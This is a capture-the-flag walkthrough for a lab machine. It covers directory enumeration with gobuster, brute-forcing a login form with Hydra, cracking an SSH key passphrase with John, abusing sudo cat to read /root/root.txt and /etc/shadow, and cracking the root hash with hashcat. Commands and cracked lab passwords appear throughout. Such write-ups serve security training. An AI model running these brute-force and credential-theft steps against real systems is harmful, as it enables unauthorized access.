after that started a gobuster scan on the website and got a dir named admin

gobuster dir -u http://ip -w wordlist

/admin

after that visited that dir and it was a loggin page! i visited the source code of the website and saw this comment!
 
     <!-- Hey john, if you do not remember, the username is admin -->
     
after seeing this i though of bruteforcing the login page as the machine name is brutit!

basic syntax of hydra is :

hydra -l elliot -P ~/Desktop/fsocity.txt 10.10.52.89 http-post-form "/wp-login/:log=^USER^&pwd=^PASS^&wp-submit=Log+In&redirect_to=http%3A%2F%2F10.10.52.89%2Fwp-admin%2F&testcookie=1:S=302" -f

command i used to bruteforce the login page!

hydra -l admin -P ~/Desktop/payloads/wordlist/rockyou.txt 10.10.255.112 http-post-form "/admin/:user=^USER^&pass=^PASS^:S=302" -f -Vv -t54 -I

-l is username
-P is for wordist

10.10.255.112 is the ip address you want to attack
http-post-form is the type of page you wanna attack
"/admin/: the dir
affter that it is the request that you will made! you can see this request from the network
section of the browser and see the request!

[80][http-post-form] host: 10.10.255.112   login: admin   password: xavier


logged in into the machine and got the ssh private key

tried to login into the ssh using the key but was unsuccessful

we have to change the permissions of the key to make it secure

chmod 400 id_rsa

after that it asks for a passphrase when we try to login
you can easily crack the passphrase using john

python2 ssh2john.py id_rsa > id_rsa.hash

after that just do

john --wordlist=rockyou.txt id_rsa.hash

i prefer rockyou as it will take less amount of time than the default wordlist
this will take some time to crack the passphrase

i got the passphrase :  rockinroll

after that i logged in into the macchine and checked the
sudo -l
and saw that john have perms to use /bin/cat with sudo perms

so i just  cat out the root flag with cat 
sudo cat /root/root.txt



now how to get the root user! just cat out the /etc/shadow file save the root password hash in you pc and use hashcat at -m 1800 to crack it

hashcat -m 1800 -a 0 brute.rootpass rockyou.txt -t64

the password cracked in seconds :  football


cheers for the root user!
